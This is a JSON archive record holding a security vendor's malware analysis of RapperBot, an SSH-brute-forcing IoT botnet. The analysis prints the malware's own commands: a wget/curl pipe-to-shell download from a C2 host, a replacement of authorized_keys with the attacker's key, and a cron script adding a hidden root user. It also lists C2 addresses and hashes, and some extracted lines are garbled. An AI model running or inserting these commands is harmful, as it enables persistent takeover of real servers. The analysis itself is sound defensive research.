{
    "id": "18928578-aee2-443d-b6dc-d62d048cf0ce",
    "created_at": "2023-01-12T15:09:26.699604Z",
    "updated_at": "2025-03-27T02:10:04.363586Z",
    "deleted_at": null,
    "sha1_hash": "d8141e5ae73b0856feae51f1c3dd07a979f15ad0",
    "title": "2022-08-03 - So RapperBot, What Ya Bruting For-",
    "authors": "",
    "file_creation_date": "2022-08-18T03:55:59Z",
    "file_modification_date": "2022-08-18T03:55:59Z",
    "file_size": 371830,
    "plain_text": "# So RapperBot, What Ya Bruting For?\n\n**fortinet.com/blog/threat-research/rapperbot-malware-discovery**\n\nAugust 3, 2022\n\nFortiGuard Labs has been tracking a rapidly evolving IoT malware family known as “RapperBot” since mid-June 2022. This family borrows\nheavily from the original Mirai source code, but what separates it from other IoT malware families is its built-in capability to brute force\ncredentials and gain access to SSH servers instead of Telnet as implemented in Mirai.\n\nIn addition, recent samples show that its developers have started adding code to maintain persistence, which is rarely done in other Mirai\nvariants. This provides threat actors with continued access to infected devices via SSH even after the device is rebooted or the malware has\nbeen removed.\n\n**Affected Platforms: Linux**\n\n**Impacted Users: Any organization**\n\n**Impact: Remote attackers gain control of the vulnerable systems**\n\n**Severity Level: Critical**\n\nThis article reveals how this threat infects and persists on a victim device, as well as interesting changes that make us question the real\nintention of the threat actors.\n\n## Discovery\n\nIn June 2022, FortiGuard Labs encountered IoT malware samples with SSH-related strings, something not often seen in other IoT threat\ncampaigns. What piqued our interest more was the size of the code referencing these strings in relation to the code used for DDoS attacks,\nwhich usually comprises most of the code in other variants.\n\nUpon further analysis, we discovered that this malware family, dubbed \"RapperBot,” is designed to function primarily as an SSH brute forcer\nwith limited DDoS capabilities. As is typical of most IoT malware, it targets ARM, MIPS, SPARC, and x86 architectures.\n\n\n-----\n\ne a e appe ot co es o a ea y Ju y epo t o [C C](https://www.ics-cert.org.cn/portal/page/112/1208496c5e164aceb8dadd08ab993dd2.html) e e a e bedded U to a ou ube ap us c deo as ou d\nolder samples. The samples of RapperBot released after this report do not contain this URL.\n\n## Hello From the Other Side\n\nRapperBot heavily reuses parts of the Mirai source code, but its features and implementation details, e.g., the Command & Control (C2)\ncommand protocol, differs significantly from the original Mirai and typical Mirai-based variants monitored by FortiGuard Labs.\n\nUnlike the majority of Mirai variants, which natively brute force Telnet servers using default or weak passwords, RapperBot exclusively scans\nand attempts to brute force SSH servers configured to accept password authentication. The bulk of the malware code contains an\nimplementation of an SSH 2.0 client that can connect and brute force any SSH server that supports Diffie-Hellmann key exchange with 768-bit\nor 2048-bit keys and data encryption using AES128-CTR.\n\nA distinctive feature of the brute forcing implementation in RapperBot is the use of “SSH-2.0-HELLOWORLD” to identify itself to the target SSH\nserver during the SSH Protocol Exchange phase. The appearance of this RapperBot in mid-June coincides with the observation of this same\n[client identification string by SANS Internet Storm Center in their honeypot logs.](https://isc.sans.edu/diary/Analysis+of+SSH+Honeypot+Data+with+PowerBI/28872)\n\nEarlier samples had the brute-forcing credential list hardcoded into the binary. From July onwards, samples now retrieve this list from another\nport on the C2 server. This allows the threat actors to continually add new SSH credentials without having to update infected devices with new\nsamples. This port number ranges from 4343 to 4345 in the latest samples.\n\nOnce RapperBot successfully brute forces an SSH server, the valid credentials are reported to the C2 server on a separate port (currently\n48109) without executing further commands on the remote victim.\n\nIn late June, however, FortiGuard Labs found some samples that attempted to self-propagate via a remote binary downloader postcompromise. The commands executed on the compromised SSH server are shown below.\n\nsh\n\nenable\n\nshell\n\ndebug shell\n\ncmd\n\nwget http://2[.]58[.]149[.]116/w -O- | sh; curl http://2[.]58[.]149[.]116/c -O- | sh\n\nFor unknown reasons, this propagation functionality was removed in samples collected a few days later and has not been seen in subsequent\nsamples. As with the original Mirai, we suspect the threat actors have implemented a separate loader system that would subsequently connect\nto the victim to download and execute the bot client.\n\n## Never Gonna Give You Up\n\nSince mid-July, RapperBot has switched from self-propagation to maintaining remote access into the brute-forced SSH servers. It runs a shell\ncommand to replace remote victims’ ~/.ssh/authorized_keys with one containing the threat actors’ SSH public key with the comment\n“helloworld,” as shown below.\n\ncd ~ && rm -rf .ssh && mkdir .ssh && echo \"sshrsaAAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemT\nHc47hdTBfj89FeHJGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdNzBcU05QhhWW6tSuYcXcyAz8Cp7\nqTqThFFHbdxdqqrWy6fNt8q/cgI30NBa5W2LyZ4b1v6324IEJuxImARIxTc96Igaf30LUza8kbZyc3bewY6IsFUN1PjQJcJi0ubVLyWyyJ554Tv8BBfPdY\nFJYUSVVT4yX2p7L6iRpW212eZmqLMSoR5a2a/tO2s1giIlb+0EHtFWc2QH7yz/ZBjnun7opIoslLVvYJ9cxMoLeLr5Ig+zny+IEA3x090xtcL62X0jea6b\nZze6oVuOTCBijuyvOM6ROZ6s/wl4CQAOSLDeFIP5L1paP9V1XLaYLDBAodNaUPFfTxggH3tZrnnU8Dge5/1JNa08F3WNUPM1S1x8L2HMatwc82\n2J1PqJH8OqGTVjdWe40mD2osRgLo1EOfP/SFBTD5VEo95K2ZLQ== helloworld\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~;\n\nPublic keys stored in ~/.ssh/authorized_keys allow anyone with the corresponding private key to connect and authenticate to a SSH server\nwithout needing to supply a password. This presents a threat to compromised SSH servers as threat actors can access them even after SSH\ncredentials have been changed or SSH password authentication is disabled. Moreover, since the file is replaced, all existing authorized keys\nare deleted, which prevents legitimate users from accessing the SSH server via public key authentication.\n\nApart from maintaining access to every SSH server that it brute forces, RapperBot is also very intent on retaining its foothold on any devices\non which it is executed. Samples from mid-July append the same aforementioned SSH key to the local \"~/.ssh/authorized_keys\" on the\ninfected device upon execution. This allows RapperBot to maintain its access to these infected devices via SSH even after a device reboot or\nthe removal of RapperBot from the device – something that is atypical to most Mirai variants. In an attempt to better hide in plain sight, the\nlatest samples use a more innocuous comment \"system key generated by server 20220709\" for the public key instead of “helloworld.”\n\nIn the latest RapperBot samples, the malware also started adding the root user \"suhelper” to the infected device by directly writing to\n“/etc/passwd” and “/etc/shadow/”, further allowing the threat actor to take complete control of the device. In conjunction, it adds the root user\naccount every hour by writing the following script to “/etc/cron hourly/0” in the event that other users (or botnets) attempt to remove their\n\n\n-----\n\naccou t o t e ct syste e co a d to add t e oot use s p o ded be o\n\n#!/bin/sh\n\nuseradd -u 0 -g 0 -o -d / suhelper -p '$1$1OJBlhUV$E9DMK0xdoZb8W8wVOibPQ/' >/dev/null 2>&1\n\nFigure 1 illustrates how the latest samples of RapperBot work. Dotted lines indicate potential actions that FortiGuard Labs assesses that the\nthreat actor could perform but have not been observed in the wild.\n\nFigure 1: RapperBot execution flow\n\n## You Can’t See Me\n\nWhile early samples had strings in plaintext, subsequent samples added extra obfuscation to the strings by building them on the stack. This\nprevents common analysis tools and detection techniques from extracting human-readable strings from binary files (Figure 2).\n\nFigure 2: String encoding in RapperBot samples\n\nFurthermore, these latest samples implemented an additional layer of Mirai-style XOR encoding to hide these strings from memory scanners\nduring execution.\n\n[While most Mirai and Gafgyt botnet operators, like Keksec, tend to include strings identifying themselves within the malware samples, the](https://www.fortinet.com/blog/threat-research/enemybot-a-look-into-keksecs-latest-ddos-botnet)\ndevelopers of this malware maintain a relatively low profile (apart from occasional references to rap music).\n\n## Network Protocol\n\nRapperBot communicates with its C2 server via TCP requests at separate ports to receive commands (443 in the latest samples), download\nSSH credential lists, or report valid credentials during SSH brute forcing.\n\nThe network protocol for commands is explained in further detail below.\n\nEach request contains a bot ID, a 32-byte value hardcoded in the binary. FortiGuard Labs observed two IDs as follows:\n\nd4 1c 74 44 70 95 28 ff f0 98 ae 4e 6f 92 ba d5 0f cd 56 29 c5 12 53 a1 fe 46 53 c7 0b b5 18 27\n\nf6 b7 0b 00 14 77 35 f9 8d 6d 5d c4 bd 23 88 7e cf 5e 02 ce 54 5f e7 b1 e6 3f 2a 16 71 b6 eb 9a (a separate cluster seen only in late\nDecember 2021)\n\nAs a side note, pivoting on these bot IDs allowed us to find older samples from November 2021. However, the SSH brute forcing capability was\nonly seen in samples from mid-June 2022.\n\nRapperBot starts by sending a registration packet to the C2 server. This includes the argument (referred to as “source” by Mirai) used when\nthe binary was executed in the victim system, which usually provides some basic contextual info about its execution. For instance,\n“ssh.wget.arm7” would tell the C2 that the binary was spread via SSH protocol, downloaded via the wget utility, and is of ARM architecture.\n\nThe succeeding communication uses the following structure:\n\nstruct rapperbot_registration {\n\nbyte bot_id[32];\n\nint command_code;\n\nsource [32];\n\n};\n\nHere are the command codes supported by RapperBot:\n\n**0x00: Register (used by the client)**\n**0x01: Keep-Alive/Do nothing**\n**0x02: Stop all DoS attacks and terminate the client**\n**0x03: Perform a DoS attack**\n**0x04: Stop all DoS attacks**\n\nRight after the registration packet, the client sends another request to notify the C2 that the client is ready to receive commands. The C2\nserver usually responds with a keep-alive command to acknowledge the request (Figure 3).\n\nFigure 3: RapperBot client-server communication\n\n\n-----\n\nes des t e eep a e co a d, e d d ot obse e a y ot e co a ds o t e C se e du g ou a a ys s\n\nHowever, RapperBot does support a very minimal set of DoS attacks, including plain UDP and TCP STOMP flood attacks that are very similar\nto Mirai’s implementation.\n\nThe attack command structure is as follows:\n\nstruct rapperbot_attack_command {\n\nbyte bot_id[32];\n\nint command_code; // 0x03\n\nbyte vector; // type of DoS attack\n\nushort target_port;\n\nint duration;\n\nint target_ip;\n\n};\n\n## Mystery Motivation\n\nFortiGuard Labs has been monitoring this threat for over a month. During that time, it has undergone several interesting changes that raise\nmore questions than answers when attempting to pinpoint the primary motivation of the threat actors in launching this campaign.\n\nAt one point, samples were observed where the DDoS attack capabilities were entirely removed and added back a week later. Could the DDoS\nfunctionality have been retained for masquerading as a typical DDoS botnet to avoid drawing too much attention? It is also possible that this\nwhole campaign is still a work in progress.\n\nAdditionally, self-propagation was removed after a few days in late June, with the current focus on aggressively retaining continued access to\nbrute-forced SSH servers. Are the threat actors more interested in collecting compromised SSH devices than expanding their botnet?\n\nOn top of that, we have not seen additional payloads delivered after brute forcing. We can only speculate on why the threat actors are\namassing a rapidly growing collection of compromised SSH servers. Over 3,500 unique IPs have been observed in the past 1.5 months\nattempting to scan and brute-force SSH servers with the SSH-2.0-HELLOWORLD client identification string. IPs from the US, Taiwan, and\nSouth Korea comprised half of the observed IPs (Figure 4).\n\nFigure 4: Scanner IP Count from mid-June 2022 to late July 2022\n\n## Conclusion\n\nAlthough this threat heavily borrows code from Mirai, it has features that set it apart from its predecessor and its variants. Its ability to persist in\nthe victim system gives threat actors the flexibility to use them for any malicious purpose they desire.\n\nDue to some significant and curious changes that RapperBot has undergone, its primary motivation is still a bit of a mystery. Regardless, since\nits primary propagation method is brute forcing SSH credentials, this threat can easily be mitigated by setting strong passwords for devices or\ndisabling password authentication for SSH (where possible).\n\nFortiGuard Labs will continue to monitor RapperBot’s development.\n\n## Fortinet Protections\n\nFortinet customers are protected by the following:\n\nThe FortiGuard Antivirus service detects and blocks this threat as ELF/Mirai and Linux/Mirai.\nThe FortiGuard Web Filtering Service blocks the C2 servers and downloaded URLs.\n\n[FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the](https://www.fortinet.com/support/support-services/fortiguard-security-subscriptions/ipreputation-antibot)\nFortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide\nup-to-date threat intelligence about hostile sources.\n\n## IOCs\n\n### Files\n\n92ae77e9dd22e7680123bb230ce43ef602998e6a1c6756d9e2ce5822a09b37b4\na31f4caa0be9e588056c92fd69c8ac970ebc7e85a68615b1d9407a954d4df45d\n\ne8d06ac196c7852ff71c150b2081150be9996ff670550717127db8ab855175a8\n\n\n-----\n\n3a 5d0ec6d3 3 d53 836d3c0 909 e98 6 b 8 bdb e ca 89 88 8a\nc83f318339e9c4072010b625d876558d14eaa0028339db9edf12bbcafe6828bb\n\n05c78eaf32af9647f178dff981e6e4e43b1579d95ccd4f1c2f1436dbfa0727ad\n\n88bbb772b8731296822646735aacbfb53014fbb7f90227b44523d7577e0a7ce6\ne8f1e8ec6b94ea54488d5f714e71e51d58dcdfe4be3827c55970d6f3b06edf73\n\n23256f231f3d91b0136b44d649b924552607a29b43a195024dbe6cde5b4a28ad\n\n77b2e5fb5b72493bde35a6b29a66e6250b6a5a0c9b9c5653957f64a12c793cd5\n\ndcdeedee4736ec528d1a30a585ec4a1a4f3462d6d25b71f6c1a4fef7f641e7ae\n\nebb860512a55c1cdc8be1399eec44c4481aedb418f15dbda4612e6d38e9b9010\n\n9d234e975e4df539a217d1c4386822be1f56cea35f7dd2aa606ae4995894da42\n1975851c916587e057fa5862884cbac3fa1e80881ddd062392486f5390c86865\n\n8380321c1bd250424a0a167e0f319511611f73b53736895a8d3a2ad58ffcd5d5\n\nf5ff9d1261af176d7ff1ef91aa8c892c70b40caa02c17a25de22539e9d0cdd26\n\n2298071b6ba7baa5393be064876efcdbd9217c212e0c764ba62a6f0ffc83cc5a\n\n2479932a6690f070fa344e5222e3fbb6ad9c880294d5b822d7a3ec27f1b8b8d5\n\n1d5e6624a2ce55616ef078a72f25c9d71a3dbc0175522c0d8e07233115824f96\n\n746106403a98aea357b80f17910b641db9c4fedbb3968e75d836e8b1d5712a62\n\nddf5aff0485f395c7e6c3de868b15212129962b4b9c8040bef6679ad880e3f31\n\ne56edaa1e06403757e6e2362383d41db4e4453aafda144bb36080a1f1b899a02\n\n55ff25b090dc1b380d8ca152428ba28ec14e9ef13a48b3fd162e965244b0d39b\n\n8e9f87bb25ff83e4ad970366bba47afb838028f7028ea3a7c73c4d08906ec102\n\nd86d158778a90f6633b41a10e169b25e3cb1eb35b369a9168ec64b2d8b3cbeec\n\nff09cf7dfd1dc1466815d4df098065510eec504099ebb02b830309067031fe04\n\n### Download URLs\n\nhxxp://31[.]44[.]185[.]235/x86\n\nhxxp://31[.]44[.]185[.]235/mips\nhxxp://31[.]44[.]185[.]235/arm7\nhxxp://2[.]58[.]149[.]116/arm\n\nhxxp://2[.]58[.]149[.]116/spc\n\nhxxp://2[.]58[.]149[.]116/mips\n\nhxxp://2[.]58[.]149[.]116/x86_64\n\nhxxp://2[.]58[.]149[.]116/ssh/arm7\n\nhxxp://2[.]58[.]149[.]116/ssh/mips\n\nhxxp://2[.]58[.]149[.]116/ssh/x86\n\nhxxp://2[.]58[.]149[.]116/ssh/spc\n\nhxxp://194[.]31[.]98[.]244/ssh/new/spc\n\nhxxp://194[.]31[.]98[.]244/ssh/new/x86\n\nhxxp://194[.]31[.]98[.]244/ssh/new/mips\n\nhxxp://194[.]31[.]98[.]244/ssh/new/arm7\n\nhxxp://194[.]31[.]98[.]244/ssh/new/arm\n\nhxxp://194[.]31[.]98[.]244/ssh/new/x86\n\nhxxp://194[.]31[.]98[.]244/ssh/new/mips\n\nhxxp://194[.]31[.]98[.]244/ssh/new/arm7\n\nhxxp://194[.]31[.]98[.]244/ssh/new/arm\n\nhxxp://185[.]225[.]73[.]196/ssh/new/arm\n\nhxxp://185[.]225[.]73[.]196/ssh/new/arm7\n\nhxxp://185[.]225[.]73[.]196/ssh/new/mips\n\nhxxp//185[.]225[.]73[.]196/ssh/new/x86\n\n### C2\n\n31[.]44[.]185[.]235\n\n2[.]58[.]149[.]116\n\n194[.]31[.]98[.]244\n\n185[.]225[.]73[.]196\n\n### Threat Actor SSH public key\n\nAAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQMD3i8tpQWT2cX/mwGgSRCz7HMLyxt87olYIPemTIRB\nGGm1KpWg8lrXeMW+5jIXTFmEFhbJ18wc25Dcds4QCM0DvZGr/Pg4+kqJ0gLyqYmB2fdNzBcU05QhhWW6tSuYcXcyAz8Cp73JmN6TcPuVqHeFY\nNBa5W2LyZ4b1v6324IEJuxImARIxTc96Igaf30LUza8kbZyc3bewY6IsFUN1PjQJcJi0ubVLyWyyJ554Tv8BBfPdY4jqCr4PzaJ2Rc1JFJYUSVVT4yX2\n\n\n-----\n\ng b 0 t c Q y / j u op os J9c o e 5 g y 3 090 tc 6 0jea6bt o U s e6o uO C juy O 6 O 6s/ C\nBAodNaUPFfTxggH3tZrnnU8Dge5/1JNa08F3WNUPM1S1x8L2HMatwc82x35jXyBSp3AMbdxMPhvyYI8v2J1PqJH8OqGTVjdWe40mD2osRgLo1E\n\n### Threat Actor root user\n\n/etc /passwd suhelper:x:0:0::/:\n\n/etc /shadow suhelper:$1$1OJBlhUV$E9DMK0xdoZb8W8wVOibPQ/:19185:0:99999:7:::\n\n_Learn more about Fortinet’s_ _[FortiGuard Labs threat research and intelligence organization and the FortiGuard Security Subscriptions and](https://www.fortinet.com/fortiguard/labs?utm_source=blog&utm_campaign=fortiguard-labs)_\n_[Services portfolio.](https://www.fortinet.com/fortiguard/labs?tab=security-bundles&utm_source=blog&utm_campaign=security-bundles)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-03 - So RapperBot, What Ya Bruting For-.pdf"
    ],
    "report_names": [
        "2022-08-03 - So RapperBot, What Ya Bruting For-.pdf"
    ],
    "threat_actors": [
        {
            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
            "created_at": "2022-10-25T16:07:24.471018Z",
            "updated_at": "2025-03-27T02:02:10.24394Z",
            "deleted_at": null,
            "main_name": "Cron",
            "aliases": [],
            "source_name": "ETDA:Cron",
            "tools": [
                "Catelites",
                "Catelites Bot",
                "CronBot",
                "TinyZBot"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "5a270f6c-2c13-4abf-861e-7d44dcfa5ceb",
            "created_at": "2023-11-03T02:00:07.794425Z",
            "updated_at": "2025-03-27T02:00:03.146871Z",
            "deleted_at": null,
            "main_name": "Keksec",
            "aliases": [],
            "source_name": "MISPGALAXY:Keksec",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536166,
    "ts_updated_at": 1743041404,
    "ts_creation_date": 1660794959,
    "ts_modification_date": 1660794959,
    "files": {
        "pdf": "https://archive.orkl.eu/d8141e5ae73b0856feae51f1c3dd07a979f15ad0.pdf",
        "text": "https://archive.orkl.eu/d8141e5ae73b0856feae51f1c3dd07a979f15ad0.txt",
        "img": "https://archive.orkl.eu/d8141e5ae73b0856feae51f1c3dd07a979f15ad0.jpg"
    }
}